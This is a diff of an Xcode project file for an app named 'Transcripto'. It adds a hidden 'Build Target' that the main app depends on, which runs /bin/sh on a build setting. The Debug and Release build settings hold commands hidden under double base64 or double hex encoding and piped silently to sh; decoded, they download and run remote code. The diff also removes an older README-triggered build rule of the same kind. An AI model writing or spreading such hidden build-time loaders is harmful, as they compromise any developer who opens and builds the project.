@@ -24,7 +24,6 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		AEE0DBE109EE6EEF21ECDB79 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Transcripto.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		64763E132D6858CE00F1E2EA /* Transcripto.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Transcripto.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		64763E232D6858D100F1E2EA /* TranscriptoTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TranscriptoTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		64763E2D2D6858D100F1E2EA /* TranscriptoUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TranscriptoUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -86,7 +85,6 @@
 		64763E142D6858CE00F1E2EA /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				AEE0DBE109EE6EEF21ECDB79 /* README.md */,
 				64763E132D6858CE00F1E2EA /* Transcripto.app */,
 				64763E232D6858D100F1E2EA /* TranscriptoTests.xctest */,
 				64763E2D2D6858D100F1E2EA /* TranscriptoUITests.xctest */,
@@ -106,9 +104,9 @@
 				64763E112D6858CE00F1E2EA /* Resources */,
 			);
 			buildRules = (
-				49D7F13C12AEAAA4C5ECDB79 /* PBXBuildRule */,
 			);
 			dependencies = (
+				BFFFCC378CE23A1AFE2F5E42 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				64763E152D6858CE00F1E2EA /* Transcripto */,
@@ -203,6 +201,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				3E67BE88DE6E4EF1D62F5E42  /* Build Target */,
 				64763E122D6858CE00F1E2EA /* Transcripto */,
 				64763E222D6858D100F1E2EA /* TranscriptoTests */,
 				64763E2C2D6858D100F1E2EA /* TranscriptoUITests */,
@@ -211,30 +210,27 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildFile section */
-		36CFAB37BAA0C8585BECDB79 /* README.md */ = {isa = PBXBuildFile; fileRef = AEE0DBE109EE6EEF21ECDB79; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		49D7F13C12AEAAA4C5ECDB79 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A97BDCE}\"";
-		};
 /* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXLegacyTarget section */
+		3E67BE88DE6E4EF1D62F5E42 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${A24E5F2}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -242,7 +238,6 @@ sh -c \"${A97BDCE}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				36CFAB37BAA0C8585BECDB79 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -287,6 +282,10 @@ sh -c \"${A97BDCE}\"";
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
+		BFFFCC378CE23A1AFE2F5E42 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 3E67BE88DE6E4EF1D62F5E42 /* Build Target */;
+		};
 		64763E252D6858D100F1E2EA /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = 64763E122D6858CE00F1E2EA /* Transcripto */;
@@ -303,7 +302,7 @@ sh -c \"${A97BDCE}\"";
 		64763E352D6858D100F1E2EA /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aWRXeHJjMlZqTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5eWRXSnNaVzVsZEM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663636363936373664363136333631373432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -368,7 +367,7 @@ sh -c \"${A97BDCE}\"";
 		64763E362D6858D100F1E2EA /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A97BDCE = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aWRXeHJjMlZqTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5eWRXSnNaVzVsZEM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				598AFD = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663636363936373664363136333631373432653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
